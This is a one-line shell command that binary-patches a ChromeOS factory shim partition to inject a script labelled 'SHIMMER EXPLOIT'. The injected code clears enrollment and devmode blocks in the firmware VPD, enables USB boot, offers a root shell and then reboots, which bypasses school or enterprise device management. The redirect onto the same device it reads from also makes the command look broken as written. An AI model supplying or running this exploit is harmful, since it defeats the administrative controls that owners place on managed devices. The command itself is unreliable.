sudo bbe -e 's/# Global variables\nDST_DRIVE=""\nEC_PRESENT=0\nDEVSW_PRESENT=1\nCOMPLETE_SCRIPT=""\n\n# The ethernet interface to be used. It will be determined in\n#check_ethernet_status and be passed to cros_payload_get_server_json_path as an\n# environment variable.\nETH_INTERFACE=""\n\n# Definition of ChromeOS partition layout\nDST_FACTORY_KERNEL_PART=2\nDST_FACTORY_PART=3\nDST_RELEASE_KERNEL_PART=4\nDST_STATE_PART=1\n\n# Supported actions (a set of lowercase characters)\n# Each action x is implemented in an action_$x handler (e.g.,\n# action_i)\; see the handlers for more information about what\n# each option is.\nSUPPORTED_ACTIONS=cdefimrstuvyz/echo "SHIMMER EXPLOIT"\necho "Set VPD \x28Y\x2FN\x29"\nread unroll\nif [[ $unroll == "Y" || $unroll == "y" ]]\nthen\nsudo vpd -i RW_VPD -s check_enrollment=0\nsudo vpd -i RW_VPD -s block_devmode=0\nsudo crossystem dev_boot_usb=1\nsudo crossystem block_devmode=0\necho "unenrolled"\nfi\necho "would you like a bash shell (Y\x2FN)"\nread bashshell\nif [[ $bashshell == "Y" || $bashshell == "y" ]]\nthen\nsudo bash\nfi\necho "Credits: Unicaur for finding the original shim files, Kaitlin, r58Playz and Bideos for helping with research\x2Ftesting\x2Fchecking off boxes, this script written by CoolElectronics"\necho "this is filler text----------"\nsleep 4\nreboot/g' /dev/sdb3 > /dev/sdb3
